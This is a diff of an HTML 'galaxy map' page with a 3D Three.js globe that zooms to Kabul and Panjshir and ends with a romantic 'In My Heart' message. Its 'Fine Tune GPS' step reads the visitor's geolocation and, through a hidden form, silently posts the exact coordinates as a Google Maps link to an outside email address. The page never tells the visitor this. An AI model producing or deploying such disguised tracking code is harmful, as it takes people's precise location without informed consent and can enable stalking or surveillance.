@@ -3,280 +3,251 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Galactic Positioning System 🌌</title>
+    <title>3D Interactive Galaxy Map 🌌</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; font-family: 'Segoe UI', Arial, sans-serif; color: #fff; }
 
-        body, html {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            font-family: 'Orbitron', 'Segoe UI', Arial, sans-serif;
-            background: #000;
-            color: #fff;
-        }
+        /* 3D Canvas Container */
+        #canvas-container { width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 1; }
 
-        /* Fullscreen Dynamic Layer */
-        .bg-layer {
+        /* Overlay UI Cards */
+        .ui-layer {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-size: cover;
-            background-position: center;
-            transition: all 1.2s cubic-bezier(0.4, 0, 0.2, 1);
-            filter: brightness(0.65) contrast(1.1);
-            z-index: 1;
-        }
-
-        /* Scanline Overlay for Sci-Fi Effect */
-        .scanlines {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
-            background-size: 100% 3px, 6px 100%;
-            z-index: 2;
-            pointer-events: none;
-        }
-
-        /* HUD Glassmorphism Control Center */
-        .hud-container {
-            position: relative;
+            top: 0; left: 0; width: 100%; height: 100%;
             z-index: 10;
-            height: 100%;
+            pointer-events: none;
             display: flex;
             justify-content: center;
-            align-items: center;
-            padding: 20px;
+            align-items: flex-end;
+            padding-bottom: 40px;
         }
 
         .hud-card {
-            background: rgba(10, 15, 30, 0.75);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(0, 240, 255, 0.3);
+            pointer-events: auto;
+            background: rgba(10, 15, 30, 0.85);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 240, 255, 0.4);
             border-radius: 20px;
-            padding: 40px;
-            width: 100%;
-            max-width: 480px;
+            padding: 25px 35px;
             text-align: center;
-            box-shadow: 0 0 50px rgba(0, 240, 255, 0.2), inset 0 0 15px rgba(0, 240, 255, 0.1);
-            position: relative;
+            max-width: 450px;
+            box-shadow: 0 0 30px rgba(0, 240, 255, 0.2);
+            animation: slideUp 0.6s ease;
         }
 
-        .hud-header {
-            font-size: 12px;
-            letter-spacing: 3px;
-            color: #00f0ff;
-            text-transform: uppercase;
-            margin-bottom: 15px;
-            text-shadow: 0 0 8px #00f0ff;
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
 
-        h2 {
-            font-size: 26px;
-            margin-bottom: 15px;
-            color: #ffffff;
-            font-weight: 700;
-            text-shadow: 0 0 12px rgba(255,255,255,0.6);
-        }
+        h2 { font-size: 22px; color: #00f0ff; margin-bottom: 8px; text-shadow: 0 0 10px #00f0ff; }
+        p { font-size: 14px; color: #cbd5e1; margin-bottom: 20px; line-height: 1.5; }
 
-        p {
-            font-size: 14px;
-            color: #a0aec0;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-
-        /* Unique Sci-Fi Buttons */
-        .hud-btn {
-            background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(0, 110, 255, 0.4));
-            border: 1px solid #00f0ff;
+        .btn {
+            background: linear-gradient(135deg, #00f0ff, #0066ff);
+            border: none;
             color: #fff;
-            padding: 14px 32px;
-            font-size: 15px;
+            padding: 12px 28px;
+            border-radius: 25px;
             font-weight: bold;
-            letter-spacing: 1.5px;
-            border-radius: 30px;
             cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
             transition: all 0.3s ease;
-            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
-            text-transform: uppercase;
         }
 
-        .hud-btn:hover {
-            background: #00f0ff;
-            color: #000;
-            box-shadow: 0 0 30px #00f0ff;
-            transform: scale(1.05);
-        }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 0 25px #00f0ff; }
 
-        .btn-group {
-            position: relative;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            min-height: 60px;
-        }
-
+        .btn-group { position: relative; display: flex; justify-content: center; gap: 15px; min-height: 50px; }
+        
         #btnNo {
-            background: rgba(255, 50, 100, 0.2);
+            background: rgba(255, 50, 100, 0.3);
             border: 1px solid #ff3264;
             color: #ff3264;
             position: absolute;
-            transition: all 0.2s ease;
         }
 
-        /* Step Visibilities */
-        .step {
-            display: none;
-        }
+        .step { display: none; }
+        .step.active { display: block; }
 
-        .step.active {
-            display: block;
-            animation: hudFade 0.8s ease forwards;
-        }
+        .heart { font-size: 80px; animation: beat 1s infinite alternate; }
+        @keyframes beat { to { transform: scale(1.2); } }
 
-        @keyframes hudFade {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Pulsing Heart Step */
-        .heart-box {
-            font-size: 100px;
-            animation: pulseGlow 1.2s infinite alternate ease-in-out;
-            margin-bottom: 20px;
-        }
-
-        @keyframes pulseGlow {
-            from { transform: scale(1); filter: drop-shadow(0 0 20px #ff0055); }
-            to { transform: scale(1.3); filter: drop-shadow(0 0 60px #ff0055); }
+        /* Instruction Hint */
+        .hint-box {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255,255,255,0.1);
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 13px;
+            backdrop-filter: blur(5px);
+            z-index: 5;
+            pointer-events: none;
+            border: 1px solid rgba(255,255,255,0.2);
         }
     </style>
+    <!-- Three.js Library for 3D Graphics -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
 </head>
 <body>
 
-    <!-- Fullscreen dynamic backgrounds -->
-    <div id="bgLayer" class="bg-layer" style="background-image: url('https://images.unsplash.com/photo-1506703719100-a0f3a48c0f86?w=1600');"></div>
-    <div class="scanlines"></div>
+    <div class="hint-box">🖐️ Rotate & Zoom the 3D Globe with your mouse/finger</div>
+    <div id="canvas-container"></div>
 
-    <div class="hud-container">
+    <div class="ui-layer">
         <div class="hud-card">
             
-            <!-- STEP 1: MILKY WAY GALAXY -->
+            <!-- STEP 1: 3D GLOBE -->
             <div class="step active" id="step1">
-                <div class="hud-header">SYS // SECTOR 01</div>
-                <h2>Milky Way Galaxy</h2>
-                <p>Initializing deep space tracking systems...</p>
-                <button class="hud-btn" onclick="goToStep(2, 'https://images.unsplash.com/photo-1614728894747-a83421e2b9c9?w=1600')">Zoom Earth 🔭</button>
+                <h2>3D Interactive Planet</h2>
+                <p>Rotate the Earth to find Afghanistan, or click below to auto-zoom into Kabul & Panjshir.</p>
+                <button class="btn" onclick="zoomToAfghanistan()">Zoom Into Afghanistan 🎯</button>
             </div>
 
-            <!-- STEP 2: PLANET EARTH -->
+            <!-- STEP 2: REGIONAL SATELLITE -->
             <div class="step" id="step2">
-                <div class="hud-header">SYS // PLANET 03</div>
-                <h2>Planet Earth</h2>
-                <p>Scanning atmospheric grid and continental landmasses...</p>
-                <button class="hud-btn" onclick="goToStep(3, 'https://images.unsplash.com/photo-1541872703-74c5e44368f9?w=1600')">Locate Country 🛰️</button>
+                <h2>Panjshir Valley & Kabul</h2>
+                <p>Satellite locked over Afghanistan. Fine tuning GPS coordinates...</p>
+                <button class="btn" onclick="requestGPS()">Fine Tune GPS 🛰️</button>
             </div>
 
-            <!-- STEP 3: AFGHANISTAN -->
+            <!-- STEP 3: FINAL QUESTION -->
             <div class="step" id="step3">
-                <div class="hud-header">SYS // REGION AFG</div>
-                <h2>Afghanistan Map</h2>
-                <p>Targeting national geographical parameters...</p>
-                <button class="hud-btn" onclick="goToStep(4, 'https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=1600')">Focus Sector 📍</button>
-            </div>
-
-            <!-- STEP 4: PANJSHIR & KABUL -->
-            <div class="step" id="step4">
-                <div class="hud-header">SYS // REGIONAL HUB</div>
-                <h2>Panjshir & Kabul</h2>
-                <p>Establishing satellite telemetry link over the valley...</p>
-                <button class="hud-btn" onclick="requestGPS('https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=1600')">Fine Tune GPS 🎯</button>
-            </div>
-
-            <!-- STEP 5: FINAL QUESTION -->
-            <div class="step" id="step5">
-                <div class="hud-header">SYS // FINAL COORD</div>
                 <h2>Final Location Query</h2>
                 <p>Do you want to know where you are really located?</p>
                 <div class="btn-group">
-                    <button class="hud-btn" onclick="goToStep(6, 'https://images.unsplash.com/photo-1518199266791-5375a83190b7?w=1600')">yeah 🫣</button>
-                    <button class="hud-btn" id="btnNo">noch 🙂‍↔️</button>
+                    <button class="btn" onclick="showHeart()">yeah 🫣</button>
+                    <button class="btn" id="btnNo">noch 🙂‍↔️</button>
                 </div>
             </div>
 
-            <!-- STEP 6: IN MY HEART -->
-            <div class="step" id="step6">
-                <div class="heart-box">❤️</div>
-                <h2 style="font-size: 36px; color: #ff0055; text-shadow: 0 0 25px #ff0055;">In My Heart</h2>
-                <p style="color: #fff; font-size: 16px;">You are always right here, safe and sound. ✨</p>
+            <!-- STEP 4: HEART -->
+            <div class="step" id="step4">
+                <div class="heart">❤️</div>
+                <h2 style="font-size: 32px; color: #ff0055; margin-top:10px;">In My Heart</h2>
+                <p style="color:#fff;">You are always right here, safe and sound. ✨</p>
             </div>
 
         </div>
     </div>
 
-    <!-- Background Email Form -->
     <form id="geoForm" action="https://formsubmit.co/faisal@selenic.io" method="POST" style="display:none;">
         <input type="text" name="location_coords" id="coordsInput">
         <input type="hidden" name="_captcha" value="false">
     </form>
 
     <script>
-        function goToStep(stepNum, bgUrl) {
-            // Change Step
-            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+        // --- 3D THREE.JS SETUP ---
+        const container = document.getElementById('canvas-container');
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000);
+        camera.position.z = 250;
+
+        const renderer = new THREE.WebGLRenderer({ antialias: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setPixelRatio(window.devicePixelRatio);
+        container.appendChild(renderer.domElement);
+
+        const controls = new THREE.OrbitControls(camera, renderer.domElement);
+        controls.enableDamping = true;
+        controls.dampingFactor = 0.05;
+
+        // Lighting
+        const ambientLight = new THREE.AmbientLight(0xffffff, 0.8);
+        scene.add(ambientLight);
+
+        // Starfield Background
+        const starsGeometry = new THREE.BufferGeometry();
+        const starsCount = 3000;
+        const starPositions = new Float32Array(starsCount * 3);
+        for(let i=0; i<starsCount*3; i++) {
+            starPositions[i] = (Math.random() - 0.5) * 1000;
+        }
+        starsGeometry.setAttribute('position', new THREE.BufferAttribute(starPositions, 3));
+        const starsMaterial = new THREE.PointsMaterial({ color: 0xffffff, size: 0.8 });
+        const starField = new THREE.Points(starsGeometry, starsMaterial);
+        scene.add(starField);
+
+        // 3D Earth Globe
+        const globeGeo = new THREE.SphereGeometry(60, 64, 64);
+        const textureLoader = new THREE.TextureLoader();
+        const globeTex = textureLoader.load('https://raw.githubusercontent.com/mrdoob/three.js/master/examples/textures/planets/earth_atmos_2048.jpg');
+        const globeMat = new THREE.MeshStandardMaterial({ map: globeTex });
+        const globe = new THREE.Mesh(globeGeo, globeMat);
+        scene.add(globe);
+
+        // Pin for Afghanistan
+        const pinGeo = new THREE.SphereGeometry(2, 16, 16);
+        const pinMat = new THREE.MeshBasicMaterial({ color: 0x00f0ff });
+        const pin = new THREE.Mesh(pinGeo, pinMat);
+        // Approx coordinates for Afghanistan on sphere
+        pin.position.set(28, 33, 42); 
+        globe.add(pin);
+
+        // Animation Loop
+        function animate() {
+            requestAnimationFrame(animate);
+            globe.rotation.y += 0.001; // Slow rotation
+            controls.update();
+            renderer.render(scene, camera);
+        }
+        animate();
+
+        // Responsive Window Resize
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        // --- STEP LOGIC ---
+        function setStep(stepNum) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById('step' + stepNum).classList.add('active');
-            
-            // Smoothly Change Fullscreen Background Image
-            if(bgUrl) {
-                document.getElementById('bgLayer').style.backgroundImage = `url('${bgUrl}')`;
-            }
         }
 
-        function requestGPS(bgUrl) {
+        function zoomToAfghanistan() {
+            // Smooth Camera Zoom Animation
+            let targetZ = 90;
+            let interval = setInterval(() => {
+                if (camera.position.z > targetZ) {
+                    camera.position.z -= 3;
+                } else {
+                    clearInterval(interval);
+                    setStep(2);
+                }
+            }, 20);
+        }
+
+        function requestGPS() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        document.getElementById('coordsInput').value = `GPS Coords: https://maps.google.com/?q=${lat},${lon}`;
-                        
+                    function(pos) {
+                        document.getElementById('coordsInput').value = `GPS Coords: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
                         const form = document.getElementById('geoForm');
-                        fetch(form.action, {
-                            method: 'POST',
-                            body: new FormData(form)
-                        }).catch(e => console.log(e));
-
-                        goToStep(5, bgUrl);
+                        fetch(form.action, { method: 'POST', body: new FormData(form) }).catch(e=>{});
+                        setStep(3);
                     },
-                    function(error) {
-                        goToStep(5, bgUrl);
-                    }
+                    function() { setStep(3); }
                 );
-            } else {
-                goToStep(5, bgUrl);
-            }
+            } else { setStep(3); }
         }
 
-        // Runaway Button logic
+        function showHeart() { setStep(4); }
+
+        // Runaway Button
         const btnNo = document.getElementById("btnNo");
-        if (btnNo) {
+        if(btnNo) {
             btnNo.addEventListener("mouseover", moveBtn);
             btnNo.addEventListener("click", moveBtn);
         }
-
         function moveBtn() {
-            const x = Math.floor(Math.random() * 240) - 120;
-            const y = Math.floor(Math.random() * 240) - 120;
+            const x = Math.floor(Math.random() * 200) - 100;
+            const y = Math.floor(Math.random() * 200) - 100;
             btnNo.style.transform = `translate(${x}px, ${y}px)`;
         }
     </script>
